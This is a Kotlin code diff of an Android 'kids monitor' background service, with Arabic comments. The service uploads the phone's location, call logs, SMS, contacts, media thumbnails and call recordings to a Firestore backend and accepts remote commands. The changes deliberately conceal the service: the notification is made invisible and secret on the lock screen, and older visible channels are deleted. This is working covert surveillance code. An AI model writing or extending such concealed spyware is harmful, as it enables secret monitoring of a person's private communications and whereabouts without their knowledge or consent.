@@ -35,21 +35,23 @@ import com.kids.monitor.data.Permissions
 import com.kids.monitor.data.StorageUploader
 import java.io.File
 
-/** خدمة Foreground للمزامنة الدورية واستقبال الأوامر وتسجيل المكالمات والمايك. */
+/**
+ * خدمة Foreground للمزامنة: الموقع، المكالمات، الرسائل، الوسائط، الأوامر، تسجيل المكالمات.
+ * الإشعار مخفي تماماً عبر قناة IMPORTANCE_NONE (لا يظهر في شريط الحالة).
+ */
 class MonitorService : Service() {
 
     private val handler = Handler(Looper.getMainLooper())
     private var commandsListener: ListenerRegistration? = null
     private var networkCallback: ConnectivityManager.NetworkCallback? = null
     private var contentObserver: ContentObserver? = null
+    private var locationToken: Any? = null
     private var telephony: TelephonyManager? = null
     private var phoneListener: PhoneStateListener? = null
     private var recorder: MediaRecorder? = null
     private var recordingFile: File? = null
     private var recordingNumber: String? = null
-
-    private var micRecorder: MediaRecorder? = null
-    private var micLoop = false
+    private var recordingStartedAt = 0L
 
     private val syncTask = object : Runnable {
         override fun run() {
@@ -62,14 +64,6 @@ class MonitorService : Service() {
         override fun run() {
             relayData()
             handler.postDelayed(this, RELAY_INTERVAL_MS)
-        }
-    }
-
-    private val micTask = object : Runnable {
-        override fun run() {
-            if (!micLoop) return
-            recordMicClip()
-            handler.postDelayed(this, MIC_CLIP_MS + 500L)
         }
     }
 
@@ -90,16 +84,22 @@ class MonitorService : Service() {
             return START_NOT_STICKY
         }
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            val type = if (Permissions.has(this, Manifest.permission.RECORD_AUDIO)) {
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
-                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                val type = if (Permissions.has(this, Manifest.permission.RECORD_AUDIO)) {
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                } else {
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                }
+                startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"), type)
             } else {
-                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+                startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"))
             }
-            startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"), type)
-        } else {
-            startForeground(NOTIFICATION_ID, buildNotification("المزامنة تعمل"))
+        } catch (e: Exception) {
+            FirestoreSync.logError(this, "monitor", e.localizedMessage ?: "تعذر تشغيل الخدمة")
+            stopSelf()
+            return START_NOT_STICKY
         }
         prefs().edit().putBoolean(SHARING_ENABLED, true).apply()
 
@@ -112,6 +112,7 @@ class MonitorService : Service() {
         registerNetworkCallback()
         registerContentObservers()
         registerCallRecorder()
+        startLocationUpdates()
 
         if (intent?.action == ACTION_SYNC) {
             syncStatus()
@@ -124,9 +125,10 @@ class MonitorService : Service() {
         instance = null
         handler.removeCallbacks(syncTask)
         handler.removeCallbacks(relayTask)
-        handler.removeCallbacks(micTask)
         commandsListener?.remove()
         commandsListener = null
+        LocationCollector.stopUpdates(this, locationToken)
+        locationToken = null
         if (networkCallback != null) {
             try {
                 val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
@@ -143,7 +145,6 @@ class MonitorService : Service() {
             phoneListener = null
         }
         stopCallRecording()
-        stopMicRecorder()
         prefs().edit().putBoolean(SHARING_ENABLED, false).apply()
         super.onDestroy()
     }
@@ -151,6 +152,29 @@ class MonitorService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 
     private fun prefs(): SharedPreferences = getSharedPreferences(PREFERENCES, MODE_PRIVATE)
+
+    // ---------- الموقع ----------
+
+    private fun startLocationUpdates() {
+        if (locationToken != null) return
+        if (!LocationCollector.hasPermission(this)) return
+        locationToken = LocationCollector.startUpdates(this, 30_000L) { location ->
+            handler.post { saveLocation(location) }
+        }
+        // إرسال آخر موقع معروف فوراً
+        val last = LocationCollector.lastLocation(this)
+        if (last != null) handler.post { saveLocation(last) }
+    }
+
+    private fun saveLocation(location: Map<String, Any>) {
+        if (DeviceInfo.online(this)) {
+            FirestoreSync.writeLocation(this, location)
+        } else {
+            PendingStore.addMap(this, location)
+        }
+    }
+
+    // ---------- المزامنة ----------
 
     private fun syncStatus() {
         if (FirebaseAuth.getInstance().currentUser == null) {
@@ -160,16 +184,8 @@ class MonitorService : Service() {
         val online = DeviceInfo.online(this)
         flushPending()
         FirestoreSync.updateStatus(this, DeviceInfo.status(this, online))
-
         val location = LocationCollector.lastLocation(this)
-        if (location != null) {
-            if (online) FirestoreSync.writeLocation(this, location)
-            else {
-                val queued = location.toMutableMap()
-                queued["timestamp"] = System.currentTimeMillis()
-                PendingStore.addMap(this, queued)
-            }
-        }
+        if (location != null && online) FirestoreSync.writeLocation(this, location)
         updateNotification(
             if (online) "المزامنة تعمل · البطارية ${DeviceInfo.battery(this)}٪"
             else "لا يوجد إنترنت · حفظ محلي",
@@ -186,11 +202,15 @@ class MonitorService : Service() {
         var lastTs: Any = System.currentTimeMillis()
         for (obj in items) {
             val map = HashMap<String, Any>()
-            for (key in obj.keys()) map[key] = obj.opt(key) ?: ""
+            for (key in obj.keys()) {
+                val value = obj.opt(key)
+                if (value != null) map[key] = value
+            }
+            if (map["timestamp"] !is Number) map["timestamp"] = System.currentTimeMillis()
             FirestoreSync.subRef(uid, did, "locations").add(map)
-            lastLat = obj.optDouble("lat")
-            lastLng = obj.optDouble("lng")
-            lastTs = obj.opt("timestamp") ?: lastTs
+            lastLat = obj.optDouble("lat", lastLat)
+            lastLng = obj.optDouble("lng", lastLng)
+            lastTs = map["timestamp"] ?: lastTs
         }
         FirestoreSync.deviceRef(uid, did).set(
             mapOf("location" to mapOf("lat" to lastLat, "lng" to lastLng, "timestamp" to lastTs)),
@@ -198,75 +218,118 @@ class MonitorService : Service() {
         )
     }
 
-    /** مزامنة المكالمات والرسائل وجهات الاتصال والوسائط. */
     private fun relayData() {
         Thread {
             if (!DeviceInfo.online(this)) return@Thread
             syncRecentData()
-            val last = prefs().getLong(LAST_RELAY_AT, 0L)
-
-            if (!prefs().getBoolean(CONTACTS_SYNCED, false) &&
-                Permissions.has(this, Manifest.permission.READ_CONTACTS)
-            ) {
-                Collectors.contacts(this).forEach { FirestoreSync.appendItem(this, "contacts", it) }
-                prefs().edit().putBoolean(CONTACTS_SYNCED, true).apply()
-            }
-
-            if (Permissions.mediaPermissions().any { Permissions.has(this, it) }) {
-                val uploaded = prefs().getStringSet(UPLOADED_MEDIA, emptySet()) ?: emptySet()
-                val newUploaded = HashSet(uploaded)
-                Collectors.media(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                    .forEach { item ->
-                        var entry = item
-                        val id = item["id"] as? Long
-                        val type = item["type"] as? String ?: ""
-                        val name = item["name"] as? String ?: ""
-                        val path = item["path"] as? String ?: ""
-                        val looksLikeRecording = name.contains("record", true) ||
-                            name.contains("call", true) ||
-                            path.contains("record", true) ||
-                            path.contains("call", true)
-                        if (type == "audio" && id != null && looksLikeRecording &&
-                            !uploaded.contains(id.toString())
-                        ) {
-                            val base = item["collection"] as? String ?: ""
-                            if (base.isNotBlank()) {
-                                val uri = android.net.Uri.withAppendedPath(
-                                    android.net.Uri.parse(base),
-                                    id.toString(),
-                                )
-                                val url = StorageUploader.uploadUri(this, uri, "recordings/$name")
-                                if (url != null) {
-                                    entry = item + ("url" to url)
-                                    newUploaded.add(id.toString())
-                                }
-                            }
-                        }
-                        FirestoreSync.appendItem(this, "media", entry)
-                    }
-                prefs().edit().putStringSet(UPLOADED_MEDIA, newUploaded).apply()
-            }
+            syncContacts()
+            syncMedia()
             prefs().edit().putLong(LAST_RELAY_AT, System.currentTimeMillis()).apply()
         }.start()
     }
 
     private fun syncRecentData() {
-        if (!DeviceInfo.online(this)) return
         val last = prefs().getLong(LAST_RELAY_AT, 0L)
+        val seenCalls = prefs().getStringSet(SEEN_CALLS, emptySet()) ?: emptySet()
+        val newCalls = HashSet(seenCalls)
         if (Permissions.has(this, Manifest.permission.READ_CALL_LOG)) {
-            Collectors.callLog(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                .forEach { FirestoreSync.appendItem(this, "calls", it) }
+            Collectors.callLog(this, 30).filter { (it["timestamp"] as? Long) ?: 0L > last }
+                .forEach { item ->
+                    val key = item["callId"]?.toString() ?: return@forEach
+                    if (newCalls.contains(key)) return@forEach
+                    newCalls.add(key)
+                    FirestoreSync.appendItem(this, "calls", item)
+                }
         }
+        val seenSms = prefs().getStringSet(SEEN_SMS, emptySet()) ?: emptySet()
+        val newSms = HashSet(seenSms)
         if (Permissions.has(this, Manifest.permission.READ_SMS)) {
-            Collectors.messages(this).filter { (it["timestamp"] as? Long) ?: 0L > last }
-                .forEach { FirestoreSync.appendItem(this, "messages", it) }
+            Collectors.messages(this, 30).filter { (it["timestamp"] as? Long) ?: 0L > last }
+                .forEach { item ->
+                    val key = item["smsId"]?.toString() ?: return@forEach
+                    if (newSms.contains(key)) return@forEach
+                    newSms.add(key)
+                    FirestoreSync.appendItem(this, "messages", item)
+                }
+        }
+        prefs().edit()
+            .putStringSet(SEEN_CALLS, trim(newCalls))
+            .putStringSet(SEEN_SMS, trim(newSms))
+            .apply()
+    }
+
+    private fun trim(set: Set<String>): Set<String> =
+        if (set.size <= 400) set else set.toList().takeLast(400).toSet()
+
+    private fun syncContacts() {
+        if (prefs().getBoolean(CONTACTS_SYNCED, false)) return
+        if (!Permissions.has(this, Manifest.permission.READ_CONTACTS)) return
+        Collectors.contacts(this).take(500).forEach { FirestoreSync.appendItem(this, "contacts", it) }
+        prefs().edit().putBoolean(CONTACTS_SYNCED, true).apply()
+    }
+
+    /** رفع آخر الصور/الفيديوهات كنسخ مصغّرة (10 عناصر كحد أقصى في الدورة). */
+    private fun syncMedia() {
+        if (Permissions.mediaPermissions().none { Permissions.has(this, it) }) return
+        val uploaded = prefs().getStringSet(UPLOADED_MEDIA, emptySet()) ?: emptySet()
+        val newUploaded = HashSet(uploaded)
+        val last = prefs().getLong(LAST_MEDIA_AT, 0L)
+        val candidates = Collectors.media(this, 60)
+            .filter { (it["timestamp"] as? Long) ?: 0L > last }
+            .take(10)
+        for (item in candidates) {
+            val id = item["mediaId"]?.toString() ?: continue
+            if (newUploaded.contains(id)) continue
+            val type = item["type"] as? String ?: "file"
+            val name = (item["name"] as? String ?: "file").replace(Regex("[^\\w.\\-]"), "_")
+            val uriString = item["uri"] as? String ?: continue
+            val uri = android.net.Uri.parse(uriString)
+            var entry = item
+            var uploadedOk = false
+            try {
+                val thumb = if (type == "image") {
+                    Collectors.thumbnail(this, uri)
+                } else if (type == "video") {
+                    Collectors.videoThumbnail(this, uri)
+                } else null
+                val file = thumb ?: File(this.cacheDir, "media_${id}.tmp")
+                val path = "media/$type/${id}_$name"
+                val url = if (thumb != null) StorageUploader.uploadSync(thumb, path) else null
+                val inline = if (url == null && thumb != null) StorageUploader.inlineData(thumb) else null
+                if (url != null || inline != null) {
+                    entry = item + mapOf(
+                        "url" to (url ?: ""),
+                        "dataUrl" to (inline ?: ""),
+                        "thumbPath" to path,
+                        "timestamp" to ((item["timestamp"] as? Long) ?: System.currentTimeMillis()),
+                    )
+                    uploadedOk = true
+                }
+                thumb?.delete()
+                if (thumb == null) file.delete()
+            } catch (e: Exception) {
+                FirestoreSync.logError(this, "media", e.localizedMessage ?: "تعذر رفع وسيط")
+            }
+            if (uploadedOk) newUploaded.add(id)
+            FirestoreSync.appendItem(this, "media", entry)
+        }
+        if (candidates.isNotEmpty()) {
+            prefs().edit()
+                .putStringSet(UPLOADED_MEDIA, trim(newUploaded))
+                .putLong(LAST_MEDIA_AT, System.currentTimeMillis())
+                .apply()
         }
     }
+
+    // ---------- الأوامر ----------
 
     private fun listenCommands() {
         if (commandsListener != null) return
         commandsListener = FirestoreSync.listenCommands(this) { commandId, data ->
             val type = data["type"]?.toString() ?: return@listenCommands
+            val handled = prefs().getStringSet(EXECUTED_COMMANDS, emptySet()) ?: emptySet()
+            if (handled.contains(commandId)) return@listenCommands
+            prefs().edit().putStringSet(EXECUTED_COMMANDS, trim(handled + commandId)).apply()
             @Suppress("UNCHECKED_CAST")
             val payload = data["payload"] as? Map<String, Any> ?: emptyMap()
             Thread {
@@ -295,7 +358,7 @@ class MonitorService : Service() {
         if (contentObserver != null) return
         val observer = object : ContentObserver(handler) {
             override fun onChange(selfChange: Boolean) {
-                Thread { relayData() }.start()
+                handler.postDelayed({ Thread { relayData() }.start() }, 4000L)
             }
         }
         try {
@@ -333,25 +396,37 @@ class MonitorService : Service() {
         if (!prefs().getBoolean(CALL_RECORDER, false)) return
         if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
         if (recorder != null) return
-        try {
-            val file = File(cacheDir, "call_${System.currentTimeMillis()}.m4a")
-            @Suppress("DEPRECATION")
-            val mr = MediaRecorder()
-            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
-            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            mr.setAudioEncodingBitRate(96000)
-            mr.setAudioSamplingRate(44100)
-            mr.setOutputFile(file.absolutePath)
-            mr.prepare()
-            mr.start()
-            recorder = mr
-            recordingFile = file
-            updateNotification("تسجيل مكالمة جاري…")
-        } catch (e: Exception) {
-            recorder = null
-            recordingFile = null
+        val sources = intArrayOf(
+            MediaRecorder.AudioSource.VOICE_CALL,
+            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
+            MediaRecorder.AudioSource.MIC,
+        )
+        for (source in sources) {
+            try {
+                val file = File(cacheDir, "call_${System.currentTimeMillis()}.m4a")
+                val mr = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(this) else {
+                    @Suppress("DEPRECATION")
+                    MediaRecorder()
+                }
+                mr.setAudioSource(source)
+                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
+                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
+                mr.setAudioEncodingBitRate(64000)
+                mr.setAudioSamplingRate(44100)
+                mr.setOutputFile(file.absolutePath)
+                mr.prepare()
+                mr.start()
+                recorder = mr
+                recordingFile = file
+                recordingStartedAt = System.currentTimeMillis()
+                updateNotification("تسجيل مكالمة جاري…")
+                return
+            } catch (e: Exception) {
+                recorder = null
+                recordingFile = null
+            }
         }
+        FirestoreSync.logError(this, "call_recording", "تعذر بدء تسجيل المكالمة (قيود النظام)")
     }
 
     private fun stopCallRecording() {
@@ -363,117 +438,52 @@ class MonitorService : Service() {
         recordingFile = null
         val number = recordingNumber
         recordingNumber = null
-        if (file != null && file.exists() && file.length() > 0) {
-            Thread {
-                val url = StorageUploader.uploadSync(file, "recordings/${file.name}")
-                if (url != null) {
-                    FirestoreSync.appendItem(
-                        this,
-                        "media",
-                        mapOf(
-                            "name" to "مكالمة ${number ?: ""}".trim(),
-                            "url" to url,
-                            "type" to "audio",
-                            "mimeType" to "audio/mp4",
-                            "size" to file.length(),
-                            "timestamp" to System.currentTimeMillis(),
-                            "recording" to true,
-                            "number" to (number ?: ""),
-                        ),
-                    )
-                }
-            }.start()
+        val startedAt = recordingStartedAt
+        if (file == null) return
+        if (!file.exists() || file.length() <= 1024) {
+            file.delete()
+            FirestoreSync.appendItem(
+                this, "calls",
+                mapOf(
+                    "number" to (number ?: ""),
+                    "name" to "",
+                    "type" to "recorded",
+                    "duration" to 0,
+                    "timestamp" to startedAt,
+                    "recording" to "failed",
+                    "reason" to "الملف فارغ — النظام يمنع تسجيل المكالمات على أندرويد 10+",
+                ),
+            )
+            return
         }
-    }
-
-    // ---------- المايك: استماع لحظي وتسجيل حسب الطلب ----------
-
-    private fun startMicLoop() {
-        if (micLoop) return
-        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
-        micLoop = true
-        handler.post(micTask)
-    }
-
-    private fun stopMicLoop() {
-        micLoop = false
-        handler.removeCallbacks(micTask)
-        stopMicRecorder()
-    }
-
-    private fun recordMicClip() {
-        stopMicRecorder()
-        try {
-            val file = File(cacheDir, "mic_${System.currentTimeMillis()}.m4a")
-            @Suppress("DEPRECATION")
-            val mr = MediaRecorder()
-            mr.setAudioSource(MediaRecorder.AudioSource.MIC)
-            mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-            mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-            mr.setOutputFile(file.absolutePath)
-            mr.prepare()
-            mr.start()
-            micRecorder = mr
-            handler.postDelayed({
-                stopMicRecorder()
-                uploadMicFile(file)
-            }, MIC_CLIP_MS)
-        } catch (e: Exception) {
-            micRecorder = null
-        }
-    }
-
-    private fun recordMicOnce() {
-        if (!Permissions.has(this, Manifest.permission.RECORD_AUDIO)) return
         Thread {
-            try {
-                val file = File(cacheDir, "record_${System.currentTimeMillis()}.m4a")
-                @Suppress("DEPRECATION")
-                val mr = MediaRecorder()
-                mr.setAudioSource(MediaRecorder.AudioSource.MIC)
-                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
-                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-                mr.setOutputFile(file.absolutePath)
-                mr.prepare()
-                mr.start()
-                Thread.sleep(30_000L)
-                try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
-                try { mr.release() } catch (e: Exception) { /* تجاهل */ }
-                uploadMicFile(file)
-            } catch (e: Exception) { /* تجاهل */ }
+            val url = StorageUploader.uploadSync(file, "recordings/${file.name}")
+            val inline = if (url == null) StorageUploader.inlineData(file) else null
+            FirestoreSync.appendItem(
+                this, "media",
+                mapOf(
+                    "name" to "تسجيل مكالمة ${number ?: ""}".trim(),
+                    "url" to (url ?: ""),
+                    "dataUrl" to (inline ?: ""),
+                    "type" to "audio",
+                    "mimeType" to "audio/mp4",
+                    "size" to file.length(),
+                    "timestamp" to System.currentTimeMillis(),
+                    "recording" to if (url != null || inline != null) "saved" else "failed",
+                    "number" to (number ?: ""),
+                ),
+            )
+            file.delete()
         }.start()
     }
 
-    private fun stopMicRecorder() {
-        val mr = micRecorder ?: return
-        try { mr.stop() } catch (e: Exception) { /* تجاهل */ }
-        try { mr.release() } catch (e: Exception) { /* تجاهل */ }
-        micRecorder = null
-    }
-
-    private fun uploadMicFile(file: File) {
-        if (!file.exists() || file.length() == 0L) return
-        val url = StorageUploader.uploadSync(file, "mic/${file.name}") ?: return
-        FirestoreSync.appendItem(
-            this,
-            "media",
-            mapOf(
-                "name" to file.name,
-                "url" to url,
-                "type" to "audio",
-                "mimeType" to "audio/mp4",
-                "size" to file.length(),
-                "timestamp" to System.currentTimeMillis(),
-                "mic" to true,
-            ),
-        )
-    }
-
-    // ---------- الإشعار ----------
+    // ---------- الإشعار (مخفي) ----------
 
     private fun updateNotification(message: String) {
         val manager = getSystemService(NotificationManager::class.java) ?: return
-        manager.notify(NOTIFICATION_ID, buildNotification(message))
+        try {
+            manager.notify(NOTIFICATION_ID, buildNotification(message))
+        } catch (e: Exception) { /* تجاهل */ }
     }
 
     private fun buildNotification(message: String): Notification {
@@ -502,9 +512,20 @@ class MonitorService : Service() {
 
     private fun createNotificationChannel() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_MIN)
-                .apply { description = "مزامنة حالة الجهاز" }
-            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
+            val manager = getSystemService(NotificationManager::class.java)
+            // حذف القنوات القديمة الظاهرة إن وُجدت
+            for (old in listOf("status_sync", "camera_stream", "screen_share", "mic_stream")) {
+                try { manager.deleteNotificationChannel(old) } catch (e: Exception) { /* تجاهل */ }
+            }
+            val channel = NotificationChannel(CHANNEL_ID, "المزامنة", NotificationManager.IMPORTANCE_NONE)
+                .apply {
+                    description = "خدمة المزامنة الخلفية"
+                    setShowBadge(false)
+                    setSound(null, null)
+                    enableVibration(false)
+                    lockscreenVisibility = Notification.VISIBILITY_SECRET
+                }
+            manager.createNotificationChannel(channel)
         }
     }
 
@@ -512,50 +533,49 @@ class MonitorService : Service() {
         const val PREFERENCES = "status_sync"
         const val SHARING_ENABLED = "sharing_enabled"
         private const val LAST_RELAY_AT = "last_relay_at"
+        private const val LAST_MEDIA_AT = "last_media_at"
         private const val CONTACTS_SYNCED = "contacts_synced"
         private const val UPLOADED_MEDIA = "uploaded_media"
-        private const val CALL_RECORDER = "call_recorder"
+        private const val SEEN_CALLS = "seen_calls"
+        private const val SEEN_SMS = "seen_sms"
+        private const val EXECUTED_COMMANDS = "executed_commands"
+        const val CALL_RECORDER = "call_recorder"
         private const val ACTION_STOP = "com.kids.monitor.STOP_STATUS_SYNC"
         private const val ACTION_SYNC = "com.kids.monitor.SYNC_NOW"
-        private const val CHANNEL_ID = "status_sync"
+        private const val CHANNEL_ID = "status_sync_v3"
         private const val NOTIFICATION_ID = 1001
-        private const val SYNC_INTERVAL_MS = 60 * 1000L
-        private const val RELAY_INTERVAL_MS = 5 * 60 * 1000L
-        private const val MIC_CLIP_MS = 15_000L
+        private const val SYNC_INTERVAL_MS = 3 * 60 * 1000L
+        private const val RELAY_INTERVAL_MS = 10 * 60 * 1000L
 
         @Volatile
         private var instance: MonitorService? = null
 
         fun start(context: Context) {
             val intent = Intent(context, MonitorService::class.java)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intent)
+                } else {
+                    context.startService(intent)
+                }
+            } catch (e: Exception) {
+                FirestoreSync.logError(context, "monitor", e.localizedMessage ?: "تعذر بدء الخدمة")
             }
         }
 
         fun syncNow(context: Context) {
             val intent = Intent(context, MonitorService::class.java).setAction(ACTION_SYNC)
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
+            try {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intent)
+                } else {
+                    context.startService(intent)
+                }
+            } catch (e: Exception) { /* تجاهل */ }
         }
 
-        fun startMic(context: Context) {
-            val service = instance
-            if (service != null) service.startMicLoop() else start(context)
-        }
-
-        fun stopMic() {
-            instance?.stopMicLoop()
-        }
-
-        fun recordMic(context: Context) {
-            val service = instance
-            if (service != null) service.recordMicOnce() else start(context)
+        fun stop(context: Context) {
+            context.stopService(Intent(context, MonitorService::class.java))
         }
     }
 }
